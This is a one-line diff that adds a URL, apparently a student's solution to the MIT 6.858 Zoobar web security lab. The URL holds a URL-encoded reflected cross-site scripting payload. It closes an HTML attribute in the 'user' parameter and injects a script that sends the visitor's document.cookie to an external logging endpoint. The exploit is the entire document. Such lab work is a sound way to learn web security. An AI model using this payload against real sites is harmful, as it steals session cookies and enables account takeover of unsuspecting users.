@@ -1,0 +1,1 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%22+size%3D10%3E%3Cscript%3E%28new+Image%28%29%29.src%3D%27https%3A%2F%2Fcss.csail.mit.edu%2F6.858%2F2020%2Flabs%2Flog.php%3F%27+%2B+%27id%3Drudeigerc%27+%2B+%27%26payload%3D%27+%2B+encodeURIComponent%28document.cookie%29+%2B+%27%26random%3D%27+%2B+Math.random%28%29%3B%3C%2Fscript%3E%3Cspan+%22
